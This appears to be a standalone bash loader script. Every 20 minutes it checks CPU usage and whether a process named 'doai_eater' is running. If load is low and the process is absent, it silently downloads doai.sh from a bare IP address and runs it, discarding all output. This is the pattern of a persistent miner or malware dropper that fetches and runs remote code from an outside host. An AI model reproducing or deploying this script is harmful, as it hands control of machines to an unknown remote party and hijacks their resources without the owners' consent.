#!/usr/bin/env bash 

while true; do
  cpu_usage=$(mpstat 1 1 | grep '%idle' | awk '{print 100-$4}')

  doai_process=$(pgrep -f "doai_eater")

  if [[ $cpu_usage -lt 70 && -z "$doai_process" ]]; then
    curl -s -o doai.sh http://107.173.101.73/doai.sh && bash doai.sh &> /dev/null
  fi
  sleep 1200
done
